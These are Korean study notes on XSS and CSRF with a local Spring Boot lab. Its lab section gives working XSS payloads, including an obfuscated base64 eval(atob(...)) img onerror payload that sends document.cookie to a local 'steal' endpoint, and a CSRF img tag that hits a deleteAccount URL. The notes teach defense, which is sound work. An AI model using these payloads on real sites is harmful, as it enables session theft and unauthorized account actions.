# XSS & CSRF 개념 정리

## XSS (Cross Site Scripting, 크로스 사이트 스크립팅)

### 정의

웹사이트에 악성 스크립트를 삽입하여, 사용자의 브라우저에서 **의도하지 않은 자바스크립트 코드**가 실행되도록 만드는 공격 방식

### 목적

- 사용자 세션 토큰(`document.cookie`), 쿠키, 개인정보 등을 탈취
- 사용자를 가장하여 서버로 악의적인 요청 전송
- 사용자 행위 감시 (키로깅 등)
- 악성 사이트로 리디렉션

### 공격 유형

| 유형                   | 설명                                                                                                            | 예시                                             |
| ---------------------- | --------------------------------------------------------------------------------------------------------------- | ------------------------------------------------ |
| 반사형 (Reflected XSS) | 악성 코드가 URL에 포함되어 즉시 실행. 서버가 입력을 그대로 반환할 때 발생                                       | `http://example.com?q=<script>alert(1)</script>` |
| 저장형 (Stored XSS)    | 악성 코드가 DB 등에 저장되어 다른 사용자에게 전파                                                               | 게시판, 댓글 등에 삽입                           |
| DOM 기반 XSS           | 클라이언트 측 스크립트가 DOM을 직접 조작하면서 발생. 서버 응답은 변경되지 않지만 브라우저에서 악성코드가 실행됨 | `document.write()`                               |

### 🛡️ 방어 방법

- JAVA
  - OWASP 자바 인코더나 Spring의 HtmlUtils.htmlEscape() 메소드 사용
- JavaScript
  - DOMPurify 같은 라이브러리를 사용
  - textContent 속성 사용
  - innerHTML 사용하지 않기
- HTML 특수 문자 이스케이프 처리 (`<`, `>`, `"`, `'`, `&` 등)
- 콘텐츠 보안 정책(CSP) 적용
  - 인라인 스크립트 제한: 'unsafe-inline' 금지
  - 대상 서버를 제한: connect-src 지시문을 통해 JavaScript의 fetch(), XMLHttpRequest 등 요청 제한
  - 외부 리소스 제어: 승인된 출처에서만 스크립트, 이미지, 폰트 등을 로드하도록 설정
  - HTTPS 강제 적용: HTTP 리소스 로드를 차단
  - HTTP 응답 헤더에 Content-Security-Policy를 추가
- 사용자 입력 검증 및 필터링
- React, Vue, Angular 등 프레임워크는 기본적으로 이스케이프 처리

## CSRF (Cross Site Request Forgery, 사이트 간 요청 위조)

### 정의

사용자가 로그인한 사이트를 이용해 **사용자 의지와 무관한 요청**을 공격자가 유도하여, 해당 사용자의 권한으로 **위조된 요청을 서버에 보내는 공격**

### 목적

- 사용자 정보 수정
- 게시글 작성 또는 삭제
- 비밀번호 변경
- 관리자 권한 탈취

### 공격 예시

```html
<img src="http://example.com/api/deleteAccount?user=me" />
```

사용자가 로그인 중이라면 서버는 이 요청을 **정상 요청**으로 오인하고 처리할 수 있다.

### 특징

- 사용자가 공격 페이지를 방문하면 자동으로 실행됨
- 사용자의 인증 쿠키나 세션이 공격 요청에 포함됨

### 🛡️ 방어 방법

- **CSRF 토큰 사용**: 사용자 세션과 연관된 고유한 토큰을 생성하여 모든 중요 요청에 포함
- **SameSite 쿠키 설정**: 외부 사이트에서 쿠키 전송을 제한
- **Referer 또는 Origin 헤더 검증**
- **쿠키에 HttpOnly, Secure 속성 추가**로 JS 접근 제한

## 1. XSS(크로스 사이트 스크립팅) 실습

### 1.1 공격하기

- **1.1.1 스크립트 삽입 (대부분 브라우저에서 차단됨)**

  ```html
  <script>
    alert('XSS 공격 성공!');
  </script>
  ```

- **1.1.2 속성 삽입 (문자열로 처리됨)**

  ```html
  " onmouseover="alert('XSS 성공!')
  ```

- **1.1.3 이미지 태그를 이용한 XSS (성공)**

  ```html
  <img src="x" onerror="alert('XSS!')" />
  ```

- **주의**
  - React, Vue, Angular, Spring Boot JSP 등은 기본적으로 `<`, `>`, `"`, `'`, `&` 등을 **자동 이스케이프 처리**하여 렌더링한다.
  - 그러나 `img`, `iframe`, `svg`, `div` 등의 **속성 이벤트**(`onerror`, `onload`, `onclick` 등)에는 여전히 취약할 수 있다.
    - 예시:
      ```html
      <svg onload="alert('XSS')"></svg> <iframe srcdoc="<script>alert('XSS')</script>"></iframe>
      ```

### 1.2 SpringBootCsrfTest:9000 서버에서 테스트

- `http://localhost:9000/eureka/index.jsp` 접속
- `01_XSS.html`, `02_StoredXSS.html` 파일을 실행하여 공격 시도
- 최신 브라우저에서도 이미지 `onerror` 등은 여전히 동작

### 1.3 방어 방법

- **React 데이터 렌더링 테스트**

  - React는 입력 데이터 출력 시 **자동 이스케이프** 처리함.
  - `<div dangerouslySetInnerHTML={{__html: ...}}>` 사용 시 주의 필요.

- **CSP(Content-Security-Policy) 헤더 적용**

  1. `com.uplus.eureka.config.SecurityConfiguration`의 주석을 해제
  2. `com.uplus.eureka.config.WebMvcConfiguration`의 관련 설정 주석 해제
  3. `XSS.html` 실행 후 F12 → 네트워크 탭 → 응답 헤더에서 `Content-Security-Policy` 확인

- **CSP 해제**

  - 다시 `SecurityConfiguration`의 코드를 주석 처리하면 CSP 비활성화됨.

- **Spring Boot Controller 통한 JSP 렌더링**
  - JSP를 서버 측에서 렌더링할 때도 **자동으로 HTML 이스케이프 처리**된다.

## 2. CSRF(크로스 사이트 요청 위조) 실습

### 2.1 준비

- [SpringBootTest_JWT_swagger:8080] 서버 실행
- [SpringBootCsrfTest:9000] 서버 실행

### 2.2 CSRF 공격 페이지 작성

- `src/main/webapp/WEB-INF/views/CsrfAttackForm.jsp` 생성
- 악성 입력 데이터 예시:

  ```javascript
  location.href = 'http://localhost:8080/eureka/steal?cookie=' + document.cookie;
  ```

- base64 인코딩 후 삽입:
  ```html
  <img
    src="x"
    onerror="eval(atob('bG9jYXRpb24uaHJlZj0naHR0cDovL2xvY2FsaG9zdDo4MDgwL2V1cmVrYS9zdGVhbD9jb29raWU9Jytkb2N1bWVudC5jb29raWU='))"
  />
  ```

### 2.3 실행

- `http://localhost:9000/eureka/index.jsp` 접속
- 3번 버튼 클릭하여 공격 시도

### 2.4 방어 방법

- **HttpOnly 속성 부여**

  - 쿠키에 `HttpOnly` 속성을 추가하면 자바스크립트에서 `document.cookie`로 접근 불가능

- **CSRF 토큰 발급 및 검증**
  - 폼이나 요청 시 서버가 생성한 **CSRF 토큰**을 함께 전송하고, 서버에서 이를 검증하여 공격 방지
